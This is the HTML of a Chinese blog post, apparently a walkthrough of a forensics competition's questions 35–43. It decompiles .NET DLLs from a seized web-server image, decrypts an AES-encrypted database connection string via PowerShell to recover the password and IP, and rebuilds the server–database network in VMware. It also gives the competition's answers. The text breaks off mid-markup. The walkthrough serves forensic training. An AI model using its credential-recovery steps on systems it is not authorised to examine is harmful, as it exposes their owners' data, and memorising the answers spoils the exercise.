&lt;p&gt;本地访问一下，发现竟然都是登录界面：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725112707145&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725112707145.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725112707145.png&#34; alt=&#34;image-20250725112707145&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;分不清，真的分不清啊，都写上去吧：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;glogin.aspx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dllogin.aspx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不过其实是有办法分开的，具体看下面一题&lt;/p&gt;
&lt;h2 id=&#34;36检材3中请对网站代码进行分析网站登录过程中代码中对输入的明文密码作了追加什么字符串处理&#34;&gt;36.检材3中，请对网站代码进行分析，网站登录过程中，代码中对输入的明文密码作了追加什么字符串处理
&lt;/h2&gt;&lt;p&gt;再次检索前面两个文件，发现只有&lt;code&gt;dllogin.aspx&lt;/code&gt;涉及到了对密码字符串的处理：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725113053969&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725113053969.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725113053969.png&#34; alt=&#34;image-20250725113053969&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;OvO
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;同时也知道了35题的正确答案：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dllogin.aspx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;37检材3中请对网站代码进行分析&#34;&gt;37.检材3中，请对网站代码进行分析，
&lt;/h2&gt;&lt;p&gt;既然是找动态链接库，那么在&lt;code&gt;dllogin.aspx&lt;/code&gt;里面搜索一下dll：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725113845738&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725113845738.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725113845738.png&#34; alt=&#34;image-20250725113845738&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;虽然没有找到，不过也给了点启发，问问ai：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725114005122&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725114005122.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725114005122.png&#34; alt=&#34;image-20250725114005122&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;为了保险起见，我们直接去检材三里面搜索一下是否有这个文件：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725114124407&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725114124407.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725114124407.png&#34; alt=&#34;image-20250725114124407&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; App_Web_dllogin.aspx.7d7c2f33.dll
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;38检材3中网站登录过程中后台接收到明文密码后进行加密处理首先使用的算法是-encryption-中的什么函数&#34;&gt;38.检材3中，网站登录过程中，后台接收到明文密码后进行加密处理，首先使用的算法是 Encryption 中的什么函数
&lt;/h2&gt;&lt;p&gt;dll文件编译后无法查看，没有头绪，原来是需要逆向dll&lt;/p&gt;
&lt;p&gt;下载net反编译工具dnspy：https://github.com/dnSpy/dnSpy/releases&lt;/p&gt;
&lt;p&gt;导出上题找到的dll文件，拖入dnspy寻找：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725115507966&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725115507966.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725115507966.png&#34; alt=&#34;image-20250725115507966&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AESEncrypt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;39检材3中分析该网站连接的数据库地址为并使用该地址解压检材4&#34;&gt;39.检材3中，分析该网站连接的数据库地址为（并使用该地址解压检材4）
&lt;/h2&gt;&lt;p&gt;多少沾点玄学在这里了&lt;/p&gt;
&lt;p&gt;在逆向出来的.net中发现引用了一个数据库有关的库&lt;code&gt;DBManager&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725120726108&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725120726108.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725120726108.png&#34; alt=&#34;image-20250725120726108&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;搜索发现这个库也在检材三中：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725120449397&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725120449397.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725120449397.png&#34; alt=&#34;image-20250725120449397&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;导出分析，在最底部看见数据库地址：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725121158979&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725121158979.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725121158979.png&#34; alt=&#34;image-20250725121158979&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;192.168.1.174
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;40检材3中网站连接数据库使用的密码为&#34;&gt;40.检材3中，网站连接数据库使用的密码为
&lt;/h2&gt;&lt;p&gt;在&lt;code&gt;DBManager&lt;/code&gt;里面找到下面这一段：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725122038106&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725122038106.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725122038106.png&#34; alt=&#34;image-20250725122038106&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#61afef;font-weight:bold&#34;&gt;Open&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Conn&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;null&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Conn&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#61afef;font-weight:bold&#34;&gt;SqlConnection&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;ConnStr&lt;/span&gt;);  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只在this.Conn为null时使用ConnStr，也就是上一题得到的密码&lt;/p&gt;
&lt;p&gt;如果不为空，那么优先使用的是AESDecrypt解密出来的连接串，所以我们要想法解密：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Mcyj19i&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;VubvqSM21YPjWnnGzk8G&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;GG6x9&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;qwdcOJd9bTEyprEOxs8TD9Ma1Lz1Ct72xlK&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;g8DDRAQ&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;X0GtJ8w&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因为这是Encryption类下面的方法，并且都是windows系统，我们也可以在本机调用解密：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;Add-Type&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;-Path&lt;/span&gt; &amp;lt;&lt;span style=&#34;color:#e06c75&#34;&gt;Path&lt;/span&gt;/&lt;span style=&#34;color:#e06c75&#34;&gt;to&lt;/span&gt;/&lt;span style=&#34;color:#e06c75&#34;&gt;DBManager&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;dll&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#e06c75&#34;&gt;DBManager.Encryption&lt;/span&gt;]::&lt;span style=&#34;color:#e06c75&#34;&gt;AESDecrypt&lt;/span&gt;( &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Mcyj19i/VubvqSM21YPjWnnGzk8G/GG6x9+qwdcOJd9bTEyprEOxs8TD9Ma1Lz1Ct72xlK/g8DDRAQ+X0GtJ8w==&amp;#34;&lt;/span&gt;,  &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HL&amp;#34;&lt;/span&gt;,  &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;forensix&amp;#34;&lt;/span&gt; )
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725123859306&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725123859306.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725123859306.png&#34; alt=&#34;image-20250725123859306&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;再次印证了39题答案是正确的，并且给出了真正的密码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;c4f2737e88
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;41检材3中网站连接数据库服务器的端口是&#34;&gt;41.检材3中，网站连接数据库服务器的端口是
&lt;/h2&gt;&lt;p&gt;见上题，ip后就是端口：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1433
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;part4&#34;&gt;part4
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;做好准备，接下来的路不是一般的难走&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;42检材-4-的原始磁盘sha256-值为&#34;&gt;42.检材 4 的原始磁盘SHA256 值为
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;E5E548CCAECD02608A0E053A5C7DCDBFBDD4BE5B0E743EB9DC8E318C369BEBC8
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;43重构该网站分析嫌疑用户的推广链接中参数里包含的-id-是&#34;&gt;43.重构该网站，分析嫌疑用户的推广链接中参数里包含的 ID 是
&lt;/h2&gt;&lt;p&gt;现在的目标是连接检材3（服务器）和检材4（数据库）&lt;/p&gt;
&lt;p&gt;登录检材4，看一眼history：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725132920533&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725132920533.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725132920533.png&#34; alt=&#34;image-20250725132920533&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;看来是先尝试了在本机安装数据库，后面还是选择使用docker了&lt;/p&gt;
&lt;p&gt;启动docker，查看现在的docker容器，启动sql1：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725133157326&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725133157326.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725133157326.png&#34; alt=&#34;image-20250725133157326&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;检材3能知道连接数据库的地址是192.168.1.174，所以要修改检材4的ip&lt;/p&gt;
&lt;p&gt;先在编辑 -&amp;gt; 虚拟网络编辑器中关闭DHCP，防止使用DHCP分配的地址&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725192915366&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725192915366.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725192915366.png&#34; alt=&#34;image-20250725192915366&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;应用并确定后，进入检材4，修改网卡配置文件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vi /etc/sysconfig/network-scripts/ifcfg-ens33
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725135358018&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725135358018.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725135358018.png&#34; alt=&#34;image-20250725135358018&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;改成下面这样：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725135731013&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725135731013.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725135731013.png&#34; alt=&#34;image-20250725135731013&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;重启网络，用&lt;code&gt;ip a&lt;/code&gt;命令查看配置是否成功：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725140143154&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725140143154.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725140143154.png&#34; alt=&#34;image-20250725140143154&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;再次登录检材3，ping一下检材4，看看是否能通：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725140832093&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725140832093.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725140832093.png&#34; alt=&#34;image-20250725140832093&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;说明他们在同一个网段了，我们之前的配置是成功的&lt;/p&gt;
&lt;p&gt;由于检材三没有数据库应用，接下来我们要在本机连接数据库，那就要让本机和他们也在同一网段&lt;/p&gt;
&lt;p&gt;打开vmware -&amp;gt; 编辑 -&amp;gt; 虚拟网络编辑器，把使用的，然后更改子网IP和NAT网关为192.168.1.0/24网段：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725170151858&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725170151858.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725170151858.png&#34; alt=&#34;image-20250725170151858&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;点击应用和确定，在本机ipconfig一下&lt;/p&gt;
&lt;p&gt;可以看见net8，也就是nat模式，ipv4地址是192.168.1.1，配置成功：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725192727677&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725192727677.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725192727677.png&#34; alt=&#34;image-20250725192727677&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;使用40题的解密结果测试连接，结果报错了：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725191816588&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725191816588.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725191816588.png&#34; alt=&#34;image-20250725191816588&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;需要下载SQL SERVER驱动程序：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://learn.microsoft.com/zh-cn/sql/connect/odbc/download-odbc-driver-for-sql-server?view=sql-server-ver16&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://learn.microsoft.com/zh-cn/sql/connect/odbc/download-odbc-driver-for-sql-server?view=sql-server-ver16
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;安装后再次测试连接，成功！&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725191736544&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725191736544.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725191736544.png&#34; alt=&#34;image-20250725191736544&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;接下来回到&lt;code&gt;App_Web_dllogin.aspx.7d7c2f33.dll&lt;/code&gt;中&lt;/p&gt;
&lt;p&gt;在登录部分我们可以看到调用了&lt;code&gt;DUserLogin&lt;/code&gt;函数，而这个函数又是来自&lt;code&gt;WDUser&lt;/code&gt;类：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725195037000&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725195037000.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725195037000.png&#34; alt=&#34;image-20250725195037000&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这个类来自哪里呢？看不出来，问一下ai吧&lt;/p&gt;
&lt;p&gt;不嫌麻烦保险起见也可以全部导出using了的dll，这个操作其实是最正确的，后面也会用上&lt;/p&gt;
&lt;p&gt;不过这里就取个巧先：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725200413977&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725200413977.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725200413977.png&#34; alt=&#34;image-20250725200413977&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;既然不是系统库，那么我们照样能在检材3里面找到这个dll，老样子导出用dnspy分析&lt;/p&gt;
&lt;p&gt;dnspy很方便，如果有对应函数，点击即可跳转至对应位置，果然是在&lt;code&gt;WBus&lt;/code&gt;里面：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725200733223&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725200733223.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725200733223.png&#34; alt=&#34;image-20250725200733223&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;DUserLogin&lt;/code&gt;函数里使用了&lt;code&gt;PD_UserLogin&lt;/code&gt;这个数据库函数，我们在数据库里面找到它：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725200902174&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725200902174.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725200902174.png&#34; alt=&#34;image-20250725200902174&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;函数说明&lt;strong&gt;登录方式分两种&lt;/strong&gt;，由&lt;code&gt;TD_Webs&lt;/code&gt;表的&lt;code&gt;DW_Type&lt;/code&gt;决定：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;DW_Type = 0&lt;/code&gt;：只允许指定的&lt;code&gt;DW_DU_Id&lt;/code&gt;用户登录&lt;/li&gt;
&lt;li&gt;&lt;code&gt;DW_Type = 1&lt;/code&gt;：允许任意用户登录（只验证用户名和密码）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725201534688&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725201534688.png&#34;&gt;
